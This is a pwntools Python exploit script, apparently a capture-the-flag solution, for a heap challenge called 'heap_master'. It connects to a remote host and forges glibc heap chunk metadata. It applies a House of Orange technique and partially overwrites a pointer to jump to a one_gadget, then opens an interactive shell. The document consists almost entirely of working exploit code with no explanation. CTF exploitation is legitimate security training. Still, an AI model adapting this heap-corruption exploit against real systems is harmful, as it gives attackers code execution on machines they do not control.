from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./heap_master")#,env = {"LD_PRELOAD":"./libc.so.6"})
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("34.92.248.154","10000")
	libc = ELF("./libc.so.6")

def menu(choice):
	p.sendlineafter(">> ",str(choice))

def add(size):
	menu(1)
	p.sendlineafter("size: ",str(size))

def edit(index,size,content):
	menu(2)
	p.sendlineafter("offset: ",str(index))
	p.sendlineafter("size: ",str(size))
	p.sendafter("content: ",content)

def free(index):
	menu(3)
	p.sendlineafter("offset: ",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b free\nb *{b1}\nb malloc_printerr\nb _IO_flush_all_lockp".format(b1 = hex(code_base + 0xF57)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
#add(0x100)
size = 0x100
payload = p64(size + 1) + p64(0) * ((size - 0x10)/8) + p64(0) + p64(0x11)
payload += p64(0) + p64(0x11)
payload += p64(0) + p64(size + 1) + p64(0) * ((size - 0x10)/8) + p64(0) + p64(0x11)
payload += p64(0) + p64(0x11)
edit(0xc8,len(payload),payload)
free(0xd0)
free(0xd0 + size + 0x20)
add(size - 0x10) 
add(size - 0x10) 
# House of Orange
size = 0x100
size2 = 0x60
payload = p64(0x0) + p64(size + 0x10 + 1)
#payload += p64(0) * ((size2 - 0x10)/8)
payload = payload.ljust(0x20,"\x00")
payload += p64(0xff) + p64(0x100)
payload = payload.ljust(size2 - 0x10,"\x00")
payload += p64(0) + p64(size - size2 + 0x10 + 1)
payload = payload.ljust(0xc0,"\x00")
payload += p64(-1&0xffffffffffffffff)
edit(0,len(payload),payload)
temp = len(payload)
payload = payload.ljust(size + 0x10, "\x00")
payload += p64(0) + p64(0x11) + p64(0) + p64(0x11)
edit(0 + temp + 0x18,len(payload) - temp - 0x18,payload.ljust(0x130,"\x00")[temp + 0x18:])
free(0x10)
if debug:
	payload = "\x10\x25"
edit(0x18,2,payload)
edit(0x8,8 + 8,p64(0x61) + p64(0))
one_gadget = 0x7ffff7a0d000 + 0xf1147
# 0x7ffff7afe147
edit(0x1f8,3,"\x47\xe1\xaf")
add(0x100)
p.interactive()
